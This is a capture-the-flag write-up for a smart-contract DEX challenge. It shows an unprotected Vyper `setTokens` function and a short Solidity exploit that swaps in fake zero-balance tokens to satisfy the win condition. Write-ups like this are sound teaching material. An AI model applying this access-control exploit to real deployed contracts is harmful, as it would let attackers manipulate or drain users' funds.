# sakarkc2122-dex - Solution

## Find the vulnerability

This challenge leaves false leads. At the beginning it seems similar to ethernaut challenge [22](https://ethernaut.openzeppelin.com/level/22).

Thedifference is that there you will be successful if you manage to drain all of at least 1 of the 2 tokens from the contract. In this challenge you need the contract balance of each token to be 0.

Inspecting the contract we'll find out that it is eaier than we might think. We found an unprotected `setTokens` fuction. Bingo!

```python
@external
def setTokens(_token1: address, _token2: address):
    self.token1 = _token1
    self.token2 = _token2
```

## Exploit the contract

To exploit the contract we just need to create two fake erc20 tokens and set them to the contract.

```solidity
contract FakeToken {
    function balanceOf(address account) external view returns (uint256) {
        return 0;
    }
}
```

```solidity
FakeToken tokenA = new FakeToken();
FakeToken tokenB = new FakeToken();
dex.setTokens(address(tokenA), address(tokenB));
dex.solve();
```
